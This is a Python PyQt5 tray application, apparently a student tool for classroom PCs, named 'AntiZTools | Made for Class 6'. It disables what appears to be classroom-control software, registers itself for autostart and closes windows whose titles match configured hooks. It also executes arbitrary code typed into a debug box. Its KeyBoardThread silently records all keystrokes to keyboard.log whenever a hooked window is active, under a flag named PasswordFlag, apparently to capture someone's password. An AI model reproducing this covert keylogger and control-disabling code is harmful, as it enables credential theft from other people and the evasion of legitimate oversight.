import requests, traceback, sys, path, random, time, json, reg, os, shutil, tempfile, ctypes
from PyQt5 import QtCore
from PyQt5 import Qt
from PyQt5.QtGui import QIcon, QFont
from PyQt5.QtWidgets import QApplication, QFrame, QMessageBox, QLabel, QAction, QMenu, QSystemTrayIcon, QDialog, QMainWindow, QVBoxLayout, QWidget, QGraphicsDropShadowEffect, QPushButton, QGridLayout, QSpacerItem, QSizePolicy
from PyQt5.QtCore import QThread, pyqtSignal, QTimer, QSize
from ui.Ui_form import Ui_Form
from ui.Ui_debugForm import Ui_debugForm
from ui.Ui_password import Ui_PasswordDialog
from ui.Ui_aowForm import Ui_aowForm
from aow import Aow1, Aow2, Aow3
from notify import NotificationWindow, WindowNotify
from config import Config
from pynput import keyboard, mouse
import pygetwindow as gw
# import qt_material

config = Config()
config.update()

def checkNetwork(url="https://example.com"):
    # return True # Debug
    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()  # 如果响应状态码不是200，将抛出HTTPError异常
        return False
    except Exception as e:
        print(e)
    return True

class ZBDialog(QDialog):
    def __init__(self, labelText, *args, **kwargs):
        super(ZBDialog, self).__init__(*args, **kwargs)
        self.setObjectName('Custom_Dialog')
        self.setWindowFlags(self.windowFlags() | QtCore.Qt.FramelessWindowHint | QtCore.Qt.WindowStaysOnTopHint)
        self.setAttribute(QtCore.Qt.WA_TranslucentBackground, True)
        self.setStyleSheet("""
#Custom_Widget {
    background: white;
    border-radius: 10px;
}

#closeButton {
    min-width: 36px;
    min-height: 36px;
    font-family: "Webdings";
    qproperty-text: "r";
    border-radius: 10px;
}
#closeButton:hover {
    color: white;
    background: red;
}
""")
        self.initUi()
        # 添加阴影
        effect = QGraphicsDropShadowEffect(self)
        effect.setBlurRadius(12)
        effect.setOffset(0, 0)
        effect.setColor(QtCore.Qt.gray)
        self.setGraphicsEffect(effect)

        self.resize(403, 146)
        self.label = QLabel(labelText, self)
        self.label.setGeometry(QtCore.QRect(30, 20, 340, 100))
        sizePolicy = QSizePolicy(QSizePolicy.Preferred, QSizePolicy.Preferred)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(3)
        sizePolicy.setHeightForWidth(self.label.sizePolicy().hasHeightForWidth())
        self.label.setSizePolicy(sizePolicy)
        font = QFont()
        font.setPointSize(25)
        self.label.setFont(font)
        self.label.setFrameShape(QFrame.NoFrame)
        self.label.setWordWrap(True)

        r = random.randint(0, 255)
        g = random.randint(0, 255)
        b = random.randint(0, 255)
        self.label.setStyleSheet(f"color: rgb({r}, {g}, {b})")

        self.adjustSize()
        self.setFixedSize(self.width(), self.height())
        self.activateWindow()
        self.setFocus()

    def initUi(self):
        layout = QVBoxLayout(self)
        # 重点： 这个widget作为背景和圆角
        self.widget = QWidget(self)
        self.widget.setObjectName('Custom_Widget')
        layout.addWidget(self.widget)

        # 在widget中添加ui
        layout = QGridLayout(self.widget)
        layout.addItem(QSpacerItem(
            40, 20, QSizePolicy.Expanding, QSizePolicy.Minimum), 0, 0)
        layout.addWidget(QPushButton(
            'r', self, clicked=self.accept, objectName='closeButton'), 0, 1)
        layout.addItem(QSpacerItem(20, 40, QSizePolicy.Minimum,
                                   QSizePolicy.Expanding), 1, 0)

    def sizeHint(self):
        return QSize(403, 146)

class PasswordDialog(QDialog, Ui_PasswordDialog):
    def __init__(self, func, parent=None):
        super(PasswordDialog, self).__init__(parent)
        self.setupUi(self)
        self.setFixedSize(self.width(), self.height())
        self.func = func
        self.label_2.setVisible(False)
        self.passwordInput.setEchoMode(Qt.QLineEdit.Password)
        self.confirmBtn.clicked.connect(self.check)
        self.setWindowFlags(QtCore.Qt.WindowStaysOnTopHint)
        self.setWindowIcon(QIcon(path.path("icon.jpg")))
    
    def check(self):
        if self.passwordInput.text() == config.get("Config.Password"):
            self.func()
            self.close()
        else:
            self.label_2.setVisible(True)

class MyQAction(QAction):
    baseText = False
    def changeText(self, text):
        if not self.baseText: self.baseText = self.text();
        self.setText(self.baseText + text)

class AowForm(QMainWindow, Ui_aowForm):
    scriptThreadStatus = False

    def __init__(self, width, height, parent=None):
        super(AowForm, self).__init__(parent)
        self.setupUi(self)
        self.setFixedSize(self.width(), self.height())
        self.setWindowIcon(QIcon(path.path("icon.jpg")))
        self.setWindowFlags(QtCore.Qt.WindowStaysOnTopHint)
        self.move(
            width - self.width() - 10,
            height - self.height() - 50
        )
        self.screenWidth = width
        self.screenHeight = height
        self.stopBtn.clicked.connect(self.stop)
        self.stopBtn.setDisabled(True)
        self.aow1Btn.clicked.connect(self.runScript(Aow1))
        self.aow2Btn.clicked.connect(self.runScript(Aow2))
        self.aow3Btn.clicked.connect(self.runScript(Aow3))
    
    def runScript(self, script):
        def _runScript():
            if not self.scriptThreadStatus:
                self.aow1Btn.setDisabled(True)
                self.aow2Btn.setDisabled(True)
                self.aow3Btn.setDisabled(True)
                self.stopBtn.setDisabled(False)
                self.scriptThread = script(self.screenWidth, self.screenHeight)
                self.scriptThread.start()
                self.scriptThreadStatus = True
        return _runScript

    def stop(self):
        self.scriptThread.forceStop()
        self.scriptThread.quit()
        self.scriptThread.wait()
        self.scriptThreadStatus = False
        self.aow1Btn.setDisabled(False)
        self.aow2Btn.setDisabled(False)
        self.aow3Btn.setDisabled(False)
        self.stopBtn.setDisabled(True)

class MyMainWindow(QMainWindow, Ui_Form):
    getGWThreadStatus = False
    ssTimerFlag = False
    keyboardThreadStatus = False

    def __init__(self,parent =None):
        super(MyMainWindow,self).__init__(parent)
        self.setupUi(self)
        self.setFixedSize(self.width(), self.height())
        self.qIcon = QIcon(path.path("icon.jpg"))
        self.setWindowIcon(self.qIcon)
        self.setWindowFlags(QtCore.Qt.WindowStaysOnTopHint)
        self.setWindowTitle("AntiZTools | Made for Class 6.")
    
    def _initTray(self):
        self.stOnStAction = MyQAction("开机自启：", self)
        self.winTitleAction = MyQAction("窗口标题：", self)
        self.conStatusAction = MyQAction("计算机管理：", self)
        self.openAction = QAction("打开主界面", self)
        self.exitAction = QAction("退出程序", self)
        self.aowAction = QAction("窗口的艺术", self)
        self.trayIconMenu = QMenu(self)
        self.trayIconMenu.addActions((self.stOnStAction, self.winTitleAction, self.conStatusAction))
        self.trayIconMenu.addSeparator()
        self.trayIconMenu.addAction(self.aowAction)
        self.trayIconMenu.addSeparator()
        self.trayIconMenu.addActions((self.openAction, self.exitAction))
        self.openAction.triggered.connect(self.openPwdDialog(myWin.show))
        self.exitAction.triggered.connect(self.openPwdDialog(app.quit))
        self.aowAction.triggered.connect(self.openAowDialog)
        self.winTitleAction.changeText("未运行")
        self.trayIcon = QSystemTrayIcon(self)
        self.trayIcon.setContextMenu(self.trayIconMenu)
        self.trayIcon.setIcon(self.qIcon)
        self.trayIcon.setToolTip(config.get("Tray.ToolTip"))
        self.trayIcon.show()
    
    def changeTrayIcon(self, icon):
        self.trayIcon.setIcon(QIcon(icon))
    
    def init(self):
        try:
            self._init()
        except Exception as e:
            print(traceback.format_exc())
            QMessageBox.warning(self, "发生错误", "运行发生错误，请将下列错误信息提交给开发者：\n{}".format(str(e)))

    def _init(self):
        self._initTray()
        self.desktop = QApplication.desktop()

        self.autoStartThread = AutoStartThread()
        self.autoStartThread.messager.connect(self.showMessage)
        self.autoStartThread.start()
        
        self.clearLogsBtn.clicked.connect(self.clearLogs)
        self.titleBtn.clicked.connect(self.runGWThread)
        self.stopGetGWThread.clicked.connect(self.stopGWThread)
        self.enableAutoStart.clicked.connect(self.setAutoStart)
        self.AutoStartTipLabel.setText(path.cwdPath(config.get("Config.EXEFileName")))

        self.execCode.clicked.connect(self.execCodeFunc)
        self.execCode_2.clicked.connect(self.execCodeThreadFunc)
        self.debugHelpBtn.clicked.connect(self.debugHelp)

        self.disableController.clicked.connect(self.disableControllerFunc)
        self.enableController.clicked.connect(self.enableControllerFunc)

        self.openDebugForm.clicked.connect(self.openDebugFormFunc)
        
        self.resetCfg()
        self.saveCfgBtn.clicked.connect(self.saveCfg)
        self.reCfgBtn.clicked.connect(self.resetCfg)
        self.acCfgBtn.clicked.connect(self.acCfg)

        self.getWindowThread = GetWindowThread(self.desktop.width(), self.desktop.height())
        self.getWindowThread.execer.connect(self.execInnerFunc)
        self.getWindowThread.logger.connect(self.log)
        self.getWindowThread.stopThread.connect(self.stopGWThread)
        self.runGWThread()

        self.keyboardThread = KeyBoardThread()

        self.log("<p style='color:green;'>Init Success!</p>")

        if int(config.get("ScreenSaver.StartScreenSaverTimer")) != 0:
            self.ssTimer = QTimer()
            self.ssTimer.timeout.connect(self.startScreenSaver)
            self.ssTimer.start(int(config.get("ScreenSaver.StartScreenSaverTimer"))*1000)
        if config.get("Config.StartShow"):
            self.log("<i>Show on starting.</i>")
            myWin.show()
        if config.get("Tray.StartMsg") != "":
            self.log("<i>Show Tray Message.</i>")
            self.showMessage(config.get("Tray.StartMsg"))

        WindowNotify(app, f"{config.get('Tray.ToolTip')}每日资讯", "Contents Here", parent=self).show().showAnimation()
    
    def openAowDialog(self):
        self.aowForm = AowForm(self.desktop.width(), self.desktop.height())
        self.aowForm.show()

    def openDebugFormFunc(self):
        if self.getGWThreadStatus:
            tt = self.debugFormTitle.text()
            tt = tt if tt else "debugForm"
            self.debugForm = DebugForm(tt, self.desktop.width(), self.desktop.height())
            self.debugForm.closeBtn.clicked.connect(self.closeDebugForm)
            self.getWindowThread.debugFormStatus = True
            self.debugForm.show()
        else:
            QMessageBox.warning(self, "调试窗口", "请先启动getGW线程")

    def setDebugForm(self, title):
        if self.debugForm:
            self.debugForm.setTitleText(title)

    def closeDebugForm(self):
        if self.getGWThreadStatus:
            self.getWindowThread.debugFormStatus = False
        self.debugForm.close()

    def startScreenSaver(self):
        try:
            lit = self.getLastInputTime()
            self.log("LastInputTime:", lit)
            if lit >= int(config.get("ScreenSaver.StartScreenSaverLastTime")):
                if not self.ssTimerFlag:
                    self.ssTimerFlag = True
                    self.log("<p style='color:green;'>Starting ScreenSaver</p>")
                    os.system(config.get("ScreenSaver.ScreenSaverCmd"))
            else:
                self.ssTimerFlag = False
        except Exception as e:
            self.log("<p style='color:red;'>StartingScreenTimerException:", str(e), "</p>")
            self.log("<i>Stopping StartingScreenTimer</i>")
            self.ssTimer.stop()

    def getLastInputTime(self):
        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32

        class LASTINPUTINFO(ctypes.Structure):
            _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_ulong)]

        lii = LASTINPUTINFO()
        lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
        user32.GetLastInputInfo(ctypes.byref(lii))
        millis = kernel32.GetTickCount() - lii.dwTime
        seconds = millis / 1000
        return seconds
    
    def showMessage(self, msg, *args, **kwargs):
        try:
            self.trayIcon.showMessage(config.get("Tray.ToolTip"), msg, self.qIcon, *args, **kwargs)
        except Exception:
            pass

    def saveCfg(self):
        cfg_str = self.CfgTextarea.toPlainText()
        try:
            config.data = json.loads(cfg_str)
            config.save()
            QMessageBox.information(self, "保存成功", "保存成功！\n有些功能重启程序后生效")
        except Exception as e:
            QMessageBox.warning(self, "保存失败", "保存失败！\n{}".format(str(e)))
    
    def resetCfg(self):
        self.CfgTextarea.setText(json.dumps(config.data, ensure_ascii=False, indent=4))
    
    def acCfg(self):
        config.autoComplete()
        self.resetCfg()
    
    def debugHelp(self):
        QMessageBox.information(self, "调试指南", """
        主线程执行：在MainWindow中执行代码\n
        子线程执行：在RunCodeThread中执行代码\n
        在主线程中，调用self.log(*args)来输出调试信息到日志框\n
        在子线程中，调用self.logger.emit(str)来输出调试信息到日志框\n
        在子线程中，调用self.execer.emit(str, (args,))来执行主线程名为str的方法，并附带参数*(args,)
        """)

    def execCodeFunc(self):
        try:
            exec(self.DebugCode.toPlainText())
        except Exception as e:
            self.log(str(e))
    
    def execCodeThreadFunc(self):
        runCodeThread = RunCodeThread(self.DebugCode.toPlainText())
        runCodeThread.logger.connect(self.log)
        runCodeThread.execer.connect(self.execInnerFunc)
        runCodeThread.start()
    
    def execInnerFunc(self, func, args):
        try:
            getattr(self, func)(*args)
        except Exception as e:
            self.log(str(e))
    
    def notifySuccess(self, title, msg):
        NotificationWindow.success(app, title, msg)
    
    def notifyError(self, title, msg):
        NotificationWindow.error(app, title, msg)

    def notifyInfo(self, title, msg):
        NotificationWindow.info(app, title, msg)
    
    def notifyWarning(self, title, msg):
        NotificationWindow.warning(app, title, msg)

    def openPwdDialog(self, func):
        def _openPwdDialog():
            PasswordDialog(func).exec_()
        return _openPwdDialog

    def runGWThread(self):
        if config.get("WindowTitle.Enable") and self.getGWThreadStatus == False:
            self.getWindowThread.exitFlag = False
            self.getWindowThread.start()
            self.getGWThreadStatus = True
            self.getgwstatus.setText("正在运行")
            self.getgwstatus.setStyleSheet("color: green;")
            self.winTitleAction.changeText("正在运行")

    def stopGWThread(self):
        try:
            self.getWindowThread.forceStop()
            self.getWindowThread.quit()
            self.getGWThreadStatus = False
            self.getgwstatus.setText("未运行")
            self.winTitleAction.changeText("未运行")
            self.getgwstatus.setStyleSheet("color: red;")
        except Exception:
            pass
    
    def runKeyBoardThread(self):
        if self.keyboardThreadStatus == False:
            self.keyboardThreadStatus = True
            self.keyboardThread.start()
    
    def stopKeyBoardThread(self):
        try:
            self.keyboardThread.forceStop()
            self.keyboardThread.quit()
            self.keyboardThreadStatus = False
        except Exception:
            pass
    
    def enableControllerFunc(self):
        controllerStatus = reg.ControllerStatus()
        if controllerStatus.status():
            controllerStatus.enable()
        if not controllerStatus.status():
            self.controllerStatus.setText("未禁用")
            self.conStatusAction.changeText("未禁用")
            self.controllerStatus.setStyleSheet("color: green")
            self.enableController.setDisabled(True)
            self.disableController.setDisabled(False)

    def disableControllerFunc(self):
        controllerStatus = reg.ControllerStatus()
        if not controllerStatus.status():
            controllerStatus.disable()
        if controllerStatus.status():
            self.controllerStatus.setText("已禁用")
            self.conStatusAction.changeText("已禁用")
            self.controllerStatus.setStyleSheet("color: red")
            self.disableController.setDisabled(True)
            self.enableController.setDisabled(False)

    def setAutoStart(self):
        autoStarter = reg.AutoStarter(path.cwdPath(config.get("Config.EXEFileName")), config.get("Config.RegAppName"))
        if not autoStarter.is_auto_start():
            autoStarter.set_auto_start()
        if autoStarter.is_auto_start():
            self.AutoStartLabel.setText("已启用")
            self.stOnStAction.changeText("已启用")
            self.AutoStartLabel.setStyleSheet("color: green")
            self.enableAutoStart.setDisabled(True)
    
    def openZBDialog(self, msg, w, h):
        zbDialog = ZBDialog(msg)
        # zbDialog.label.adjustSize()
        zbDialog.move(random.randint(0, w - zbDialog.width()), random.randint(0, h - zbDialog.height()))
        zbDialog.exec_()

    def clearLogs(self):
        self.logTextarea.clear()
    
    def log(self, *args):
        logStr = ""
        for i in args:
            logStr += str(i) + " "
        self.logTextarea.append(logStr)

class DebugForm(QMainWindow, Ui_debugForm):
    def __init__(self, title, width, height, parent=None):
        super(DebugForm, self).__init__(parent)
        self.setupUi(self)
        self.setFixedSize(self.width(), self.height())
        self.setWindowIcon(QIcon(path.path("icon.jpg")))
        self.setWindowFlags(QtCore.Qt.WindowStaysOnTopHint)
        self.setWindowTitle(title)
        self.move(
            width - self.width() - 10,
            height - self.height() - 50
        )

    def setTitleText(self, text):
        self.titletext.setText(text)


class AutoStartThread(QThread):
    messager = pyqtSignal(str)

    def __init__(self):
        super(AutoStartThread, self).__init__()

    def __del__(self):
        self.wait()

    def run(self):
        autoStarter = reg.AutoStarter(path.cwdPath(config.get("Config.EXEFileName")), config.get("Config.RegAppName"))
        if autoStarter.is_auto_start():
            myWin.AutoStartLabel.setText("已启用")
            myWin.AutoStartLabel.setStyleSheet("color: green")
            myWin.enableAutoStart.setDisabled(True)
            myWin.stOnStAction.changeText("已启用")
        else:
            myWin.AutoStartLabel.setText("未启用")
            myWin.AutoStartLabel.setStyleSheet("color: red")
            myWin.stOnStAction.changeText("未启用")
        
        controllerStatus = reg.ControllerStatus()
        if controllerStatus.status():
            myWin.controllerStatus.setText("已禁用")
            myWin.controllerStatus.setStyleSheet("color: red")
            myWin.disableController.setDisabled(True)
            myWin.conStatusAction.changeText("已禁用")
        else:
            myWin.controllerStatus.setText("未禁用")
            myWin.controllerStatus.setStyleSheet("color: green")
            myWin.enableController.setDisabled(True)
            myWin.conStatusAction.changeText("未禁用")
        
        temp_dir = tempfile.gettempdir()
        failedtimes, successtimes, cleantipstr = 0, 0, ""
        for item in os.listdir(temp_dir):
            if item.startswith(config.get("TempFileClear.TempFilePrefix")):
                try:
                    print("Delete Temp:", item)
                    shutil.rmtree(os.path.join(temp_dir, item))
                    successtimes += 1
                except Exception as e:
                    failedtimes += 1
                    print(e)
        if failedtimes >= int(config.get("TempFileClear.CleanFailedTimes")):
            cleantipstr = "。\n失败数量过多，请引起注意！"
        self.messager.emit(f"临时文件清理完毕，成功{successtimes}个，失败{failedtimes}个{cleantipstr}")

class KeyBoardThread(QThread):
    enterFlag = False

    def __init__(self):
        super(KeyBoardThread, self).__init__()
    
    def forceStop(self):
        try:
            self.file.close()
            self.keyboardListener.stop()
            self.mouseListener.stop()
        except Exception:
            del self.keyboardListener
            del self.mouseListener
    
    def on_press(self, key):
        try:
            char = key.char
            if char:
                print(f"{char} Pressed.")
                self.file.write(char)
        except AttributeError:
            print(f"{key} Pressed.")
            self.file.write(f"[{str(key).replace('Key.', '')}]")
        if not self.enterFlag:
            self.enterFlag = True
    
    def on_mouse(self, x, y, dx=None, dy=None):
        print("Mouse move", x, y, dx, dy)
        if self.enterFlag:
            self.file.write("\n")
            self.enterFlag = False

    def run(self):
        self.file = open(path.path("keyboard.log"), "a+", encoding="utf-8")
        now = time.localtime()
        time_str = time.strftime("%Y-%m-%d %H:%M:%S", now)
        self.file.write(f"\n\n({time_str}):\n")

        self.mouseListener = mouse.Listener(
            on_move=self.on_mouse,
            on_click=self.on_mouse,
            on_scroll=self.on_mouse)
        self.mouseListener.start()

        self.keyboardListener = keyboard.Listener(
                on_press=self.on_press)
        self.keyboardListener.start()
        self.keyboardListener.join()
        self.keyboardListener.stop()
        self.mouseListener.stop()

class GetWindowThread(QThread):
    exitFlag = False
    execer = pyqtSignal(str, tuple)
    logger = pyqtSignal(str)
    stopThread = pyqtSignal()
    ZBDialogFlag = True
    PasswordFlag = False
    debugFormStatus = False

    def __init__(self, width, height):
        super(GetWindowThread, self).__init__()
        self.width = width
        self.height = height
        self.hooks = config.get("WindowTitle.hook")
    
    def forceStop(self):
        self.exitFlag = True
    
    def run(self):
        if checkNetwork(url=config.get("Config.CheckUrl")):
            # 状态异常
            self.ZBDialogFlag = False
            self.execer.emit("changeTrayIcon", (path.path("icon_colored.png"),))
            self.logger.emit("Started ZBDialog Listener.")

        _oldTitle = None
        while True:
            try:
                if self.exitFlag:
                    break
                window = gw.getActiveWindow()
                if window == None:
                    time.sleep(int(config.get("WindowTitle.Interval")))
                    continue
                title = window.title
                matchFlag = False
                isNewWindow = False
                if _oldTitle != title and self.debugFormStatus:
                    self.execer.emit("setDebugForm", (title,))
                    isNewWindow = True
                    _oldTitle = title
                for i in self.hooks:
                    if not i.get("enable", True):
                        continue
                    if (i.get("title") == title) or (i.get("fuzzyMatching") and i.get("title") in title):
                        matchFlag = True
                        if i.get("handler") == "ZBDialog":
                            if not self.ZBDialogFlag:
                                self.logger.emit("Stopped ZBDialog Listener.")
                                self.openZBDialog(i.get("data", {}))
                                self.execer.emit("changeTrayIcon", (path.path("icon.jpg"),))
                                if i.get("data", {}).get("notify", False):
                                    self.execer.emit("notifySuccess", ("检测到装逼", "已自动打开装逼窗口",))
                                self.ZBDialogFlag = True
                        elif i.get("handler") == "keyboardListener":
                            if not self.PasswordFlag:
                                self.PasswordFlag = True
                                # Start catch keyboard input thread
                                self.execer.emit("runKeyBoardThread", ())
                                self.logger.emit("Started KeyBoard Listener.")
                        elif i.get("handler") == "closeWindow":
                            if isNewWindow and window != None:
                                window.close()
                                self.logger.emit("Closed Window: " + title)
                                msg = i.get("data", {}).get("msg", "已自动关闭不良界面")
                                if msg and not i.get("data", {}).get("notify", False):
                                    self.execer.emit("showMessage", (msg,))
                                elif msg and i.get("data", {}).get("notify", False):
                                    self.execer.emit("notifySuccess", ("检测到不良界面", msg,))
                if not matchFlag:
                    if self.PasswordFlag:
                        self.PasswordFlag = False
                        # Stop catch keyboard input thread
                        self.execer.emit("stopKeyBoardThread", ())
                        self.logger.emit("Stopped KeyBoard Listener.")
            except Exception as e:
                self.logger.emit(str(e))
            time.sleep(int(config.get("WindowTitle.Interval")))
        self.stopThread.emit()
        self.debugFormStatus = False
    
    def openZBDialog(self, i):
        for _ in range(i.get("times", 5)):
            self.execer.emit(
                "openZBDialog",
                (
                    random.choice(i.get("msg", ["检测到有人在装逼，我不说是谁", "震惊，六班竟然突破了科技封锁", "原神哥真的是太有实力啦"])),
                    self.width,
                    self.height,
                )
            )
            time.sleep(0.4)

class RunCodeThread(QThread):
    logger = pyqtSignal(str)
    execer = pyqtSignal(str, tuple)

    def __init__(self, code):
        super(RunCodeThread, self).__init__()
        self.code = str(code)
    
    def __del__(self):
        self.wait()
    
    def run(self):
        try:
            exec(self.code)
        except Exception as e:
            self.logger.emit(str(e))

QtCore.QCoreApplication.setAttribute(QtCore.Qt.AA_EnableHighDpiScaling)
app = QApplication(sys.argv)
# setup stylesheet
# qt_material.apply_stylesheet(app, theme='dark_teal.xml')
QApplication.setQuitOnLastWindowClosed(False)
myWin = MyMainWindow()

def run():
    # init widget
    myWin.init()
    sys.exit(app.exec_())

if __name__ == "__main__":
    run()
